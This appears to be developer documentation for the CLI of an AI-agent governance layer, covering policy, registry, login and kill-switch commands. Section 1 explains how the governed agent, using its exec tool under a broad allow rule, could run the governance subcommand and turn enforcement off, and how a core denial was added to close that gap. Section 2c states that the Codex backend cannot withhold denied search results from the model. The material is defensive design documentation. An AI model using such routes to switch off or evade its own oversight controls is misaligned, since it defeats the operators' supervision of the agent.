# `openclaw governance` — command-line reference

Complete reference for the governance command-line tools added by this fork:
syntax, options, what each command does internally, exit codes, and worked
examples.

**Keep this current.** When a command is added, renamed, or changes behaviour,
update this file in the same change — a CLI reference that has drifted is worse
than none, because it is trusted.

Last verified against the build of **2026-08-31**, Node v22.22.3 (Windows) and
Node v22.23.2 (Ubuntu 24.04 / WSL2).

**Coverage, checked rather than assumed — and the previous version of this
paragraph was neither (finding 160).** Every command the CLI registers appears
below. The command tree is `governance` → `login` · `logout` · `whoami` ·
`policy` · `agent` · `agents` · `groups` · `backend` · `sessions` · `pending` ·
`audit` · `deployment` · `kill` · `set-policy-authoring`.

~~`no known CLI gaps remain against the dashboard` still holds~~ — **that was an
assertion nobody had measured (finding 158).** Measuring it found four capability
groups reaching the dashboard and the HTTP API but not the CLI. **T34 closed on
2026-08-31**: two were built, two were kept with the reason written down, and the
rule was narrowed to match. **§2d names what is deliberately not here.**

---

## 1. Invoking the CLI

During development, commands run through the repo's dev runner, which compiles
first if sources changed:

```bash
node scripts/run-node.mjs governance <subcommand> [...]
```

On an installed build the binary name is used directly:

```bash
openclaw governance <subcommand> [...]
```

This document writes `openclaw governance …` for brevity; substitute the dev
runner form when working from source.

### Where the CLI is defined

| Concern                                   | File                                                                                                                                                                  |
| ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Command definitions and option parsing    | `src/cli/program/register.governance.ts`, with the policy commands in `register.governance.policy.ts` and the agent registry in `register.governance.agents.ts` (T16) |
| Registration in the lazy command registry | `src/cli/program/command-registry-core.ts`                                                                                                                            |
| Help/description metadata                 | `src/cli/program/core-command-descriptors.ts`                                                                                                                         |

Commands are registered **lazily**: the registry maps the root command name
`governance` to a module that is only imported when that command is actually
invoked, so adding these did not slow down `openclaw --help` or unrelated
commands.

### What the CLI talks to

The CLI does **not** go through the Gateway's HTTP API. It calls the governance
domain modules directly and reads/writes the same files the Gateway uses:

```
~/.openclaw/governance/
  policy.json          policy document: posture, ask mode, rules, locked agents
  audit-ledger.jsonl   append-only hash-chained decision log
  users.json           dashboard accounts (hashed passwords)
  agents.json          the agent registry: which agents exist, whose they are (M4)
  sessions.json        dashboard login sessions
  rule-requests.json   User-submitted rule requests
```

`OPENCLAW_GOVERNANCE_DIR` overrides that directory. Tests set it so they never
touch real operator state; a deployment can set it to place the ledger on
separate storage.

**Consequence worth knowing:** because the CLI and the Gateway are separate OS
processes writing the same files, every write goes through a cross-process lock
(`src/governance/file-lock.ts`). This is why an earlier version corrupted the
audit chain, and why the CLI is safe to use while the Gateway is running.

### Authorization

**Rewritten 2026-08-31 — finding 160. Everything this section said was true on
2026-08-20 and false from 2026-08-24, when T5 gave the CLI a login.** What stood
here is struck through below, because the way it survived is worth more than the
correction.

**The CLI checks the caller's tier, on every command that changes anything.**
Sign in with `governance login`; the session is a `0600` file inside the
self-protected governance directory, and every command resolves it through
`verifySession` — the same function the dashboard uses, so a session revoked in
the browser dies on the command line too. The gate is `requireCliActor` /
`requireCliIdentity` (`src/cli/program/governance-cli-gate.ts`), which takes the
question as a predicate so both surfaces ask it through the same permission
functions. **A command you are not entitled to run prints the reason and changes
nothing.**

**Changes are recorded against the account, by name and tier**, exactly as the
dashboard records them. The literal actor `cli` survives in only two places,
both being cases where no account _can_ sign in: the repair command for accounts
that predate groups, and the bootstrap of the first account, which has
`BOOTSTRAP_ACTOR` of its own.

**What remains true**, and is the part worth keeping: the CLI's boundary is
**filesystem permissions** (`0700` on the directory, `0600` on files, verified
enforced on Linux). Anyone with shell access as the owning user can edit
`users.json` by hand, and no login changes that. The tier check stops mistakes
and records intent; it is not a defence against somebody who already owns the
files. That was always the durable half of the paragraph below, and it was
attached to three claims that stopped being true.

> ~~The CLI performs **no role check**. It is deliberately an
> operating-system-level tool: anyone who can run it already has shell access as
> the user that owns `~/.openclaw/`, and could edit those files directly. …
> **Every** change made from the CLI is recorded in the audit ledger with the
> actor `cli`. … The honest limit: `cli` names the _origin_, not a person.
> Because the CLI has no login, there is nobody to authenticate … (Known
> limitation A6.)~~
>
> **A6 was closed on 2026-08-24.** This section went on asserting it for seven
> days, in the file whose own header says _"a CLI reference that has drifted is
> worse than none, because it is trusted."_
>
> **How it survived is the finding.** On 2026-08-30 a correction pass through
> this same file found and fixed **two** copies of "the CLI has no login" — one
> under `agent prompt`, one under `deployment` — and did not touch the section
> **titled Authorization**, which says it three times. The pass was driven by
> searching for the places the claim was _used_, and missed the place it was
> _defined_. **Grepping for a stale claim finds its citations, not its source**,
> and the source is the one a reader arrives at first.
>
> The same day's work also left this file's header saying the command tree is
> `governance → policy · agent · sessions · pending · audit · deployment · kill`.
> It has since gained `login`/`logout`/`whoami` (T5), `agents` (M4), `groups`
> (M3) and `backend` (2026-08-31) — four whole command groups, none of them in
> the sentence that claims to list them.

#### The consequence that is not about attribution (QA round 13, finding 73)

> **Closed, in two stages: the core denial on 2026-08-19 and the CLI login on
> 2026-08-24 (T5).** This note read "a CLI login remains open work" until
> 2026-08-31 — finding 160. A core denial covers `governance <subcommand>`, so
> the _agent_ cannot reach these commands through a broad allow rule; and the
> commands now require a signed-in account, so a **person** with shell access is
> at least recorded by name. Neither changes the fact that somebody who owns the
> files can edit them directly, which is the boundary this surface has always
> had and still has.

The reasoning above — _anyone who can run the CLI could edit the files
directly_ — is sound for a **human** with a shell. It does not hold for the
principal this project exists to constrain.

The governed agent runs on this machine, and `exec` is the tool it uses most.
The core command denial protects the governance **directory**
(`\.openclaw/governance`) and says nothing about the governance **command**. So:

```bash
# Refused: the core denial matches the path
cat ~/.openclaw/governance/policy.json

# Was allowed until QA round 13 — no core denial named it, and one broad
# operator rule was enough. Now refused by a core denial on the subcommand.
node openclaw.mjs governance policy set-mode off
```

Any operator allow-rule wide enough to let the agent build or run the project —
`^(node|npm|npx|pnpm) .*$`, which is the first rule most operators write — makes
the second command reachable. Four spellings were tested against the gate; all
four were allowed. The result is that the agent can disable the entire
governance layer, and the RBAC tiers, the SSH tunnel and the dashboard login are
all bypassed rather than defeated.

This is a **threat-model gap, not a bug in any function**: the design reasoned
carefully about the agent's access to resources and not about the agent's access
to the control plane governing it.

Two fixes, and they were never alternatives so much as stages:

1. **Done** — a core command denial covering `governance` subcommands, matched
   on the **subcommand pair** rather than on the binary name, because the binary
   has many spellings (`openclaw`, `node openclaw.mjs`, `npx openclaw`, a global
   shim) and the subcommand has one. Four spellings are asserted by
   `qa-round13.test.ts`. This restores the property the directory rule was
   written to provide.
2. ~~**Still open** — a CLI login, which would close A6 and this finding
   together.~~ **DONE 2026-08-24 (T5), and this line said "still open" until
   2026-08-31 — part of finding 160.** `governance login` exists, every
   mutating command resolves the signed-in account through `verifySession`, and
   the ledger records the operator by name and tier. A6 is closed.

   What is still true, and is the durable half: **the CLI's boundary is
   filesystem permissions.** A login makes changes attributable and stops a
   Viewer changing policy; it does not stop somebody who can already edit
   `users.json` by hand. That was sound for a human operator and was never
   sound for the agent, which is what fix 1 above addresses.

~~Tracked as Q-73b in `mg/REMAINING-WORK.md` §13c.~~ **Both halves are closed:**
the core denial on 2026-08-19, the login on 2026-08-24.

---

## 2. Command summary

| Command                                                                                                                   | Purpose                                                                                                                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `governance policy show`                                                                                                  | Print the policy document                                                                                                                                                                                         |
| `governance policy set-mode <mode>`                                                                                       | Set posture: enforce / monitor / off                                                                                                                                                                              |
| `governance policy set-ask <mode>`                                                                                        | Set behaviour on an unlisted action                                                                                                                                                                               |
| `governance policy add-rule`                                                                                              | Add a rule that allows or forbids something                                                                                                                                                                       |
| `governance policy remove-rule <id>`                                                                                      | Remove a rule by id                                                                                                                                                                                               |
| `governance policy set-agent-ask <agentId> <mode>`                                                                        | Per-agent override of ask behaviour                                                                                                                                                                               |
| `governance login [username]`                                                                                             | **Sign in.** Command-line changes are then recorded against your account and tier, and your permissions are enforced. A **failed** attempt is written to the audit ledger too, attributed to nobody (finding 226) |
| `governance logout`                                                                                                       | End the command-line session (revokes it, not just forgets it)                                                                                                                                                    |
| `governance whoami`                                                                                                       | Show which account the command line is signed in as                                                                                                                                                               |
| `governance policy request-setting <agentId> <ask\|mode> <value> --reason <why>`                                          | **User:** ask an Administrator to change an agent's escalation or posture                                                                                                                                         |
| `governance policy core-rules`                                                                                            | List the shipped core denials and which are switched off                                                                                                                                                          |
| `governance policy core-rule <ruleId> <true\|false>`                                                                      | **Root:** switch a core denial off or back on. The three self-protecting rules refuse                                                                                                                             |
| `governance set-policy-authoring <userId> <true\|false>`                                                                  | **Root:** allow or withhold a User account's ability to write policy                                                                                                                                              |
| `governance policy for-agent <agentId>`                                                                                   | **Agent → policies.** Posture and every rule in force for one agent                                                                                                                                               |
| `governance policy rule-agents <ruleId>`                                                                                  | **Policies → agents.** Which agents a rule binds                                                                                                                                                                  |
| `governance policy set-agent-mode <agentId> <mode>`                                                                       | **Administrator:** per-agent posture: enforce / monitor / default                                                                                                                                                 |
| `governance policy set-user-ask <username> <mode>`                                                                        | **Root:** per-**account** escalation override: off / on-miss / default                                                                                                                                            |
| `governance policy grant-folder <folder> [--except <path...>] [--access read\|write] [--agent <id>]`                      | Allow a folder and forbid named paths inside it, as one act. Writes ordinary, separately removable rules                                                                                                          |
| `governance policy set-hitl-timeout <seconds>`                                                                            | How long an escalation waits for a human                                                                                                                                                                          |
| `governance agent prompt [--stream] [--attach <path...>] <agentId> <message>`                                             | Send a prompt to an agent and print the reply. `--attach` sends files; the ledger records hash, type, size and name and **never content**                                                                         |
| `governance groups unmigrated`                                                                                            | List accounts written before groups existed, which can no longer sign in                                                                                                                                          |
| `governance groups migrate [--delete]`                                                                                    | **Destructive.** Delete every account that predates groups. Reports what would go unless `--delete` is given                                                                                                      |
| `governance organisation summary`                                                                                         | What this organisation holds: its Root, how many accounts, how many agents                                                                                                                                        |
| `governance organisation delete --confirm <root-username> --yes`                                                          | **Root, destructive.** Delete the organisation: every account including your own, and every agent, from OpenClaw too. The ledger is kept                                                                          |
| `governance agents list`                                                                                                  | The agent registry for your group, including agents that predate it                                                                                                                                               |
| `governance agents register <agentId> <displayName> [--owner <accountId>]`                                                | **Administrator:** record an agent, owned by you. `--owner` is Root-only                                                                                                                                          |
| `governance agents rename <agentId> <displayName>`                                                                        | Rename an agent you own. The id never changes                                                                                                                                                                     |
| `governance agents set-owner <agentId> <accountId>`                                                                       | Hand an agent to another Administrator, releasing its previous holders                                                                                                                                            |
| `governance agents set-codex <agentId> <on\|off>`                                                                         | **Administrator:** permit or refuse this agent on the Codex backend, where a denied search's results cannot be withheld                                                                                           |
| `governance agents access <agentId>`                                                                                      | Which accounts hold this agent by assignment. Readable by any tier that can see the agent                                                                                                                         |
| `governance agents unregister <agentId>`                                                                                  | Remove the record. The agent, its rules and its posture are untouched                                                                                                                                             |
| `governance agents provision <displayName> [--id <agentId>] [--owner <accountId>] [--workspace <path>] [--model <model>]` | **Administrator:** create a real OpenClaw agent **and** record it, as one act or none (M6)                                                                                                                        |
| `governance agents delete <agentId> --yes`                                                                                | **Administrator:** remove the record **and** delete the agent from OpenClaw. Irreversible; refuses without `--yes`                                                                                                |
| `governance backend status`                                                                                               | **Root:** whether this installation offers the Codex backend, and whether anybody chose it                                                                                                                        |
| `governance backend set-codex <on\|off>`                                                                                  | **Root:** offer or withdraw the Codex backend for the whole installation                                                                                                                                          |
| `governance agent runs`                                                                                                   | Prompt runs in flight, and who started them                                                                                                                                                                       |
| `governance agent cancel <runId>`                                                                                         | Stop one run without locking the agent down                                                                                                                                                                       |
| `governance agent transcript <agentId>`                                                                                   | Print your account's conversation with an agent                                                                                                                                                                   |
| `governance sessions`                                                                                                     | List currently-running agent sessions                                                                                                                                                                             |
| `governance deployment`                                                                                                   | **Root:** verify the deployment and network posture                                                                                                                                                               |
| `governance requests list [--pending]`                                                                                    | The rule-request queue, scoped to the agents you can see                                                                                                                                                          |
| `governance requests submit --kind --pattern --reason [--agent]`                                                          | **User:** ask an Administrator to allow something                                                                                                                                                                 |
| `governance requests decide <id> --approve\|--reject`                                                                     | **Administrator:** grant it (writing the rule) or refuse it                                                                                                                                                       |
| `governance pending list`                                                                                                 | Show timed-out escalations awaiting a decision                                                                                                                                                                    |
| `governance pending decide <id> --allow\|--deny`                                                                          | Record a late decision                                                                                                                                                                                            |
| `governance audit tail`                                                                                                   | Print recent ledger entries                                                                                                                                                                                       |
| `governance audit verify`                                                                                                 | Verify the hash chain                                                                                                                                                                                             |
| `governance kill <agentId>`                                                                                               | **User, over an agent you manage:** engage the kill switch                                                                                                                                                        |
| `governance kill <agentId> --release`                                                                                     | **User, over an agent you manage:** release a lockdown                                                                                                                                                            |

---

## 2b. Groups, and accounts that predate them

Added by M3 (2026-08-24), when the layer stopped assuming one organisation.

**A group is the unit a Root owns** — its Root, its Administrators, its Users and
Viewers. Accounts in different groups never see each other. Creating a Root
creates a group around it, so `governance login` and every account command act
inside the group of whoever is signed in.

Two rules the CLI enforces exactly as the dashboard does, because both go
through the same store rather than through their own copy of the check:

- Every account belongs to exactly one group.
- **Every User and Viewer has one Administrator answerable for it.** Root cannot
  be that Administrator — if Root wants to run a User directly, it creates an
  Administrator account and signs into that.

### `governance groups unmigrated`

Lists accounts created before groups existed. They have no group, and **nothing
can work out which organisation they belonged to** — so rather than guessing,
the layer refuses to let them sign in. The password still verifies; the account
is inert.

```
$ openclaw governance groups unmigrated
2 account(s) predate groups and cannot sign in until removed:
  kinan (root, id user-1754...)
  analyst (viewer, id user-1755...)

Run: openclaw governance groups migrate --delete
```

### `governance groups migrate [--delete]`

Deletes every account with no group. **Without `--delete` it only reports**, and
that is deliberate: this removes credentials and there is no password reset, so
the destructive form has to be typed rather than defaulted into.

It is also deliberately **not** run automatically at load. A migration that
deletes accounts the first time a new build starts is one nobody consented to;
the sign-in refusal is what makes leaving them sitting safe until an operator
decides.

Each deletion is its own ledger entry, naming the account and the reason, since
after this the ledger is the only place that says the account existed.

### `governance organisation summary`

What a deletion would take: the group id, the Root's username, and the number of
accounts and agents. Readable by anyone signed in — every fact in it is already
on the dashboard — and the Root username it prints is the word `delete` requires.

### `governance organisation delete --confirm <root-username> --yes`

**Deletes the organisation.** Every account in it, including the Root running
the command, and every agent it holds — removed from OpenClaw as well as from
governance. There is no undo and no password reset.

**Two things must both be given.** Without them the command prints what would go
and stops, exactly as `agents delete` and `groups migrate` do. `--yes` alone is
not enough: the typed name is the barrier, and skipping the prompt is not the
same as supplying it. That is on purpose — this is the surface reached by shell
history and autocomplete.

Only the organisation's own Root may run it. An Administrator is refused by the
same guard the HTTP route uses (`guardOrganisationDeletion`), not by a second
tier check written here — two surfaces answering one question two ways is this
project's most-found defect.

```
$ openclaw governance organisation delete
This deletes organisation group-1756... entirely: 3 account(s) including your own
Root, and 2 agent(s), removed from OpenClaw as well as from governance.
You will be signed out and there is no way back in: there is no password reset,
and the next account created on this installation starts a new organisation.
The audit ledger is kept. It is the record of what happened here and is not an
operator's to delete.

Re-run with: openclaw governance organisation delete --confirm kinan --yes
```

**Why this belongs on the command line at all.** It is the recovery act. The
states an operator reaches it from — a dashboard they can no longer sign into,
an installation being handed over, a demonstration being reset between runs —
are exactly the states where the browser is the surface that is not working.
`groups migrate` exists for the same reason.

Agents are deleted first, while Root still exists: if the host refuses one, the
organisation is intact, the operator is still signed in, and the command says so
and can be run again. What is kept is the audit ledger and its archives — see
`ROLE-MODEL.md` §"Deleting the organisation" for why.

---

## 2c. The agent registry

Added by M4 (2026-08-24), and it is the change that gives the layer a **noun**
for an agent.

Before it, an agent was not a record. It existed the moment a rule, a posture, a
lockdown or an assignment happened to mention its id, and the set of agents was
reconstructed from whatever the policy document named. That is enough to _judge_
an agent and not enough to own one — there was nothing to name, nothing to hold,
and nothing to list when the honest answer was "none".

A registry entry has four fields: the **id** (the key the host and every rule
use, which never changes), a **display name**, the **group** it belongs to, and
the **one Administrator** answerable for it.

**One authorization rule covers every command here:** registering and changing
agents is the Administrator tier, and an Administrator administers the agents
_they own_. Root is exempt from the ownership half, because Root manages the
people who own agents — without that exemption, an agent whose owning
Administrator has left would be one nobody could ever re-home.

### `governance agents list`

The registry first, and the older reconstruction behind it. Agents that predate
the registry still appear, marked as owned by nobody, so nothing that used to be
listed disappears.

```
$ openclaw governance agents list
  agent-support  "Support triage"  owner user-1755...  engine: built-in only
  agent-research "Research"        owner user-1755...  engine: built-in or Codex
  agent-legacy   (not registered — predates the registry, owned by nobody)
```

"No agents are visible to you" is printed in words rather than left as a blank,
because an empty list and a failed request look identical when both render as
nothing.

**`engine:` is a permission, never an observation** (§3.5.62). The layer cannot
see which runtime an agent is actually using; it can only say which it is
allowed to use, and the wording says so. It appears here because `set-codex`
changes it from this surface, and a setting an operator can change but not read
back is one they have to take on trust. Unregistered rows carry no engine state,
because the permission lives on the registry record they do not have.

### `governance agents register <agentId> <displayName>`

Records an agent in your group, owned by you.

**It does not create an agent in OpenClaw** — `provision` does that, as of M6.
Registering an id the host already has is not a mistake: it is exactly how an
operator claims the agents an existing installation is already running, which is
the migration path into the registry.

The two verbs stay separate on purpose, and `provision` **refuses** an id the
host already holds and points you back here. That refusal is what makes
provisioning's rollback safe — because creating only ever creates, undoing it
only ever deletes an agent that same command made.

`--owner <accountId>` names somebody else as the owner and is **Root-only**.
Naming who answers for a workload is people management, which is the Root side
of the split this project has drawn since the role model was written.

Ids are unique **per installation, not per group**. M5 gave each group its own
policy document, which retired the original reason for that — but the rule was
re-derived rather than dropped: session keys are `agent:<id>:…` and are global,
so two groups sharing an id would collide in the session store, in T6's lineage
walk and in the kill switch. The one-bit leak ("that id is taken") is the
cheaper cost, and it is documented rather than hidden.

### `governance agents provision <displayName>`

Added by M6 (2026-08-27). **Creates a real OpenClaw agent and records it here, as
one act or none.**

```
$ openclaw governance agents provision "Support triage"
created support-triage ("Support triage") in /home/ops/agents/support-triage, owned by user-1755...
  not confirmed from here: this command is not the running gateway, so it cannot watch the agent appear.
```

That second line is deliberate. The dashboard _can_ watch the running gateway
pick the agent up and waits until it has; this command runs in its own process
and has nothing to watch, so it says so rather than implying a confirmation
nobody made.

Options: `--id` to choose an id instead of deriving one from the name, `--owner`
(Root-only, as with `register`), `--workspace`, and `--model`. Everything except
the name is optional, because the host picks sensible defaults and a form that
demands four fields to make one agent is a form people avoid.

**If anything fails, nothing is left behind.** The host write happens first — it
is the one likely to fail, so putting it first means most failures happen while
there is still nothing to undo. If the governance record cannot then be written,
the agent is deleted again and the command says so. In the rare case where that
undo _also_ fails, the command prints a warning naming the agent and the exact
command to remove it by hand, because at that point only a person can decide.

### `governance agents delete <agentId> --yes`

Added by M6. **Removes the record and deletes the agent from OpenClaw**,
including its workspace and transcripts. This is the destructive counterpart to
`unregister`, and it is a separate command rather than a flag on that one so
that an operator who has always used `unregister` cannot start destroying agents
with a command that used to be safe.

Without `--yes` it refuses and explains both options instead:

```
$ openclaw governance agents delete support-triage
This deletes agent "support-triage" from OpenClaw entirely, not just from governance.
Its workspace and transcripts go with it, and this cannot be undone.
Re-run with --yes to proceed, or use "governance agents unregister support-triage" to remove only the governance record.
```

**The host is deleted first, and the first draft of this had it backwards.** The
obvious order is "drop the record, then delete the agent", so that a host
refusal can be undone by writing the record back. That does not work:
unregistering also **revokes the agent from every account holding it**, and
re-registering restores the row and not the assignments. A failed deletion would
have left every User who had that agent quietly without it.

Deleting from the host first has no such tail. If OpenClaw refuses, nothing has
happened at all — the agent is still there and still governed. If it succeeds and
the record cannot then be removed, what is left is a governance record for an
agent that no longer exists: inert, visible, and cleared by running the command
again. Same rule as `provision`, and the same reason: **do the fallible write
first.**

### `governance agents rename <agentId> <displayName>`

Changes what the agent is called. The id is untouched, because it is what every
rule, ledger entry and command-line argument refers to.

### `governance agents set-owner <agentId> <accountId>`

Hands the agent to another Administrator — **and releases it from every account
the previous owner had given it to.**

That second half is not tidying. Assignment is constrained to agents your own
Administrator owns, so leaving the old holders in place would leave the account
file stating something the registry contradicts: an invariant that holds at the
moment it is written and rots afterwards.

### `governance agents set-codex <agentId> <on|off>`

**Administrator**, for an agent you own; Root inherits. Permits or refuses this
agent on the Codex backend.

```
$ openclaw governance agents set-codex agent-research on
agent-research may now run on the Codex backend.
  On that backend a recursive search reaching a denied path is recorded but
  NOT prevented: its results cannot be withheld from the model, because the
  Codex hook protocol has no field for substituting a tool result.
  Denials, the audit ledger and the kill switch still apply there.
  This decision has been recorded in the ledger against your account.
```

**The warning prints on the permissive direction only**, matching the
dashboard's asymmetry: permitting accepts a stated enforcement gap, while
withdrawing is the safe direction and needs no caution. It prints _after_ the
change rather than as a prompt, because this surface is scriptable and a prompt
would either block automation or be answered blind.

**This is one of two switches and it is not sufficient on its own.** An agent
permitted here still cannot use a backend Root has not enabled with
`governance backend set-codex on`. The two compose in series, so neither
permission alone opens the gap. See §3.5.62 for why the tiers differ.

Both directions are recorded, **including a restatement** — permitting an agent
that is already permitted writes an `enabled -> enabled` entry, so the ledger can
answer "who last confirmed this?" and not only "who changed it?".

### `governance agents access <agentId>`

Which accounts hold this agent **by assignment**.

```
$ openclaw governance agents access support-triage
  malek
  watcher

  Administrators and Root reach every agent by role and are deliberately not listed.
```

**The closing line is printed every time, including when the list is empty**, and
it is the point of the command rather than a footnote. Without it the list reads
as "these are the only people who can act on this agent", which is false: every
Administrator reaches every agent by role. Listing them would make every agent
look identically staffed and hide the distinction the command exists to show.

**Readable by any tier that can see the agent**, including a Viewer — matching
the route rather than tightening it. A Viewer assigned to an agent already reads
its unmasked audit entries, which name the accounts that acted; refusing them the
roster while showing them the trail would be a distinction with no content.

"No account holds this agent" is printed in words rather than left blank, because
that is a real answer an operator may be checking for deliberately.

### `governance agents unregister <agentId>`

Removes the record only. The agent's rules, posture and lockdown all survive,
because the registry never owned those. What it stops being is _owned_ — the id
falls back to the pre-registry state, and every account holding it is released.

The ledger entry keeps the name and the owner, because after this the record is
gone and the ledger is the only place that says the agent was ever owned.

### What this changes about assignment

`users/agents` — assigning agents to an account — now refuses an agent belonging
to a different Administrator. Three outcomes:

| The agent is…                                    | Assignment |
| ------------------------------------------------ | ---------- |
| registered, owned by the account's Administrator | allowed    |
| not registered at all                            | allowed    |
| registered to somebody else                      | refused    |

**The middle row is the honest limit.** An unregistered id is still assignable,
so the constraint can be sidestepped by not registering — which makes the
registry a statement of ownership rather than a gate on it. Refusing
unregistered ids would break assignment on every installation that upgrades into
M4, and would buy nothing: an agent nobody has claimed cannot be stolen from an
owner who does not exist. Closing it needs registration to be mandatory, which
needs M6's provisioning first.

**Closed 2026-08-27 (M5).** Registration is mandatory: an unregistered agent is
refused at the gate and at assignment, so there is no unowned agent left to
assign. It did not need M6 — the claim rested on reading _registering_ an agent
and _provisioning_ one as one act, and registration had been on every surface
since the registry shipped.

---

## 2d. What is deliberately **not** on the command line

**Read this before concluding a capability is missing.** The project's rule used
to read _"a capability reaching only two of the three surfaces is unfinished"_.
It was stated universally and never audited, and it was false of four capability
groups. The rule now reads:

> **Every capability reaches all three surfaces unless a stated reason says
> otherwise, and the reasons are here.**

**Two capabilities are deliberately dashboard-only as of 2026-09-02**, and the
list below was **wrong until then (finding 223)**: it named one, asserted the
rule above, and missed two cases. One of those two — `policy/user-ask` — had no
stated reason because there was none, and it was built (finding 222). The other
— releasing an unsent attachment — has a good reason that lived in
`attachment-store.ts` and not here, which is the same defect in the milder
direction: a document promising _"the reasons are here"_ while a reason was
somewhere else.

**A third entry was added on 2026-09-03 and is not a capability**, so the count
above stays at two. Sign-in rate limiting is a _behaviour_ the dashboard has and
this surface cannot have, and it is written down here for the same reason the
other two are: without the reason it reads as a gap. Keeping it under a heading
that says plainly what it is not is deliberate — the alternative was to let the
count drift, which is finding 223 in miniature.

Rule requests were the third, and were built (`T40`) because when somebody sat
down to act on the reason it did not survive: see below.

### Accounts — create, delete, re-role, reset a password

**Not the argument you expect.** "Anyone who can run the CLI could edit
`users.json` anyway" is void since T5: every command requires a signed-in
account, so the tier bar is the same as the dashboard's.

**The reason that holds is divergence cost.** The dashboard's account form
carries guards that QA rounds put there — a confirmation field on the one
irreversible step (creating Root, which has no password reset), the password
length rule stated up front, and no `root` option the server will refuse.
A second implementation of those guards is exactly where two surfaces come to
disagree, and account creation is the worst place in this system for that to
happen.

**What you can still do from here:** `governance set-policy-authoring`
withholds or restores a User's ability to write policy,
`governance groups migrate --delete` removes accounts that predate groups, and
`governance organisation delete` removes **all** of them at once.

**Why the last one is not an exception to this section.** It is not an account
command with a wider filter — it deletes the organisation, and the accounts go
because they belong to it. The divergence argument above is about _per-account
forms_: a role picker, a password field, a confirmation on creating Root. This
command has one input, the typed Root username, and the server compares it, so
there is no second implementation of anything to drift. It is also the one
account-touching act whose whole point is being reachable when the dashboard is
not (see §2b).

### Rate-limiting a sign-in

**Not a capability, and it is listed here because it reads like a missing one.**
The dashboard refuses an account for fifteen minutes after five wrong passwords.
`governance login` does not, and **cannot be made to by that mechanism**: the
counter is in-memory state belonging to the running Gateway, and every command is
its own process, so each invocation would begin with an empty table.

What this surface owes instead is a **record**, and since finding 226 it writes
one — a failed sign-in here produces the same ledger entry the route produces,
attributed to nobody. That is the honest trade, and it follows from the standing
point in §1: the command line is not a security boundary, the filesystem is.
Guessing a password from a shell buys nothing against somebody who can already
edit `users.json` — but it is not pointless against the **dashboard**, because
the plaintext it recovers works there and looks like the owner signing in
normally. So the guessing has to be visible, and now it is.

The bound that would actually stop an anonymous flood is per-**source** rather
than per-username, and it belongs to the Gateway transport layer rather than to
governance. `login-throttle.ts` states the residual in full rather than implying
it; see also finding 225, where the memory bound on that table turned out to be
the whole control's off switch.

### Releasing an attachment that was never sent

**Dashboard-only, and the reason is that the state cannot exist here.**
`agent/attachment/release` discards an attachment its uploader picked and has
not yet sent. On the command line, storing and sending are the **same act** —
`governance agent prompt --attach <path>` puts the bytes in the store and sends
them in one command — so there is never an unsent attachment for this surface to
release.

The control exists because the dashboard uploads when a file is _chosen_, which
is what makes size and type known before the prompt goes out, and that split is
what creates a state needing a discard (finding 113). A command here would have
nothing to act on.

**Not a capability gap, then, but a control for a state only one surface has** —
and worth writing down, because "the CLI cannot release attachments" reads like
a gap until you know why. It was recorded in `attachment-store.ts` and not in
this section, which is the half of finding 223 that is only a documentation
defect.

### ~~`policy set-user-ask` — the per-account escalation override~~ — **BUILT 2026-09-02 (finding 222)**

**Kept as a heading because the omission is the instructive part.** §1.6 splits
escalation two ways: an Administrator sets it per **agent**, Root sets it per
**account**. `policy set-agent-ask` shipped on 2026-08-11 with the note _"CLI
parity closed… No known CLI gaps remain against the dashboard."_ The
per-**account** half never had a command, and this section — whose whole job is
to name such cases — did not list it.

So an operator over SSH could change an agent's escalation behaviour and not a
person's, on the axis Chapter 1 assigns to Root specifically. The command is
`governance policy set-user-ask <username> <off|on-miss|default>` (§3), Root-
gated by `canManageAccounts` rather than `canManageGlobalPolicy`, because the
tier is the point of the axis.

### ~~Rule requests — submitting one, and deciding it~~ — **BUILT 2026-09-01 (T40)**

**Kept here in full, because the reason failing is more instructive than the
commands.** It read:

> **The weakest of the reasons, and flagged as such.** The obvious argument — a
> rule request is a conversation between two people, which a scriptable surface
> serves badly — is contradicted by `governance pending list` and
> `pending decide`, which do exactly that shape for timed-out escalations.
>
> **What survives is narrower.** An Administrator at a terminal who wants to act
> on a request can already write the rule with `policy add-rule` or
> `policy grant-folder`. The gap costs the **link** between the request and the
> rule it produced, not the capability. That is a real cost and a small one, and
> it is the first thing to build if this list is revisited.

Every sentence of that is true. The mistake is the last clause of the second
paragraph: **the link is not a small cost, it is the feature.** A rule-request
queue whose approvals are not joined to the rules they produced is a list of
things people asked for. Granting by hand leaves `createdRuleId` unset, the
requester's row pending for ever, and two ledger entries — a submit and an
unrelated rule-add — that nothing ties together.

The commands are `governance requests list`, `requests submit` and
`requests decide` (§3f). Each asks the question its HTTP counterpart asks:
Viewer reads the queue scoped by `canViewAgent`, User proposes, Administrator
decides. `policy request-setting` is unchanged and still files into the same
queue.

### Everything else reaches all three, and four gaps were found the other way

**On 2026-09-01 the audit was run in the opposite direction** — not _which
capabilities are missing from the command line_, but _for each command that does
exist, does it ask what its route asks?_ That had never been done, and it found
four commands that reached the surface and did not reach the same answer
(findings 173–176). Three were security gaps and one, `governance kill`, left a
known cross-tenant hole open on this surface a week after it was closed on the
other.

**The rule this adds to the one above:** a capability reaching all three surfaces
is not the same as a capability _behaving_ the same on all three, and only the
first of those had ever been measured. There is an authoritative table of route
floors in `governance-privilege-matrix.test.ts`; there is no such table for the
commands in this document.

### Everything else reaches all three

Including the two built on 2026-08-31 because no reason could be written for
them: `governance agents access` (a read-only lookup already visible to a
Viewer on the dashboard) and `governance agent runs` /
`agent cancel` (an operator over SSH had the blunt instrument — stop the
agent and keep it stopped — and not the precise one).

---

## 3. Policy commands

### `governance policy show`

Prints the whole policy document as JSON.

```bash
openclaw governance policy show
```

```json
{
  "version": 1,
  "mode": "enforce",
  "ask": "on-miss",
  "rules": [
    {
      "id": "command-1786222746899-rm01ix",
      "createdAt": "2026-08-08T20:59:06.899Z",
      "resourceKind": "command",
      "pattern": "^ls( .*)?$",
      "description": "allow ls"
    }
  ],
  "lockedAgents": []
}
```

_Internally:_ `loadPolicy()` reads `policy.json`, merging it over the defaults
so a file written by an older build (missing a newer field) still loads rather
than producing `undefined` in a permission check.

**Exit code:** `0` always, including when no policy file exists yet — the
defaults are printed instead.

### `governance policy set-mode <mode>`

Sets the enforcement posture. `<mode>` is one of:

| Mode      | Behaviour                                                                                                                                                      |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
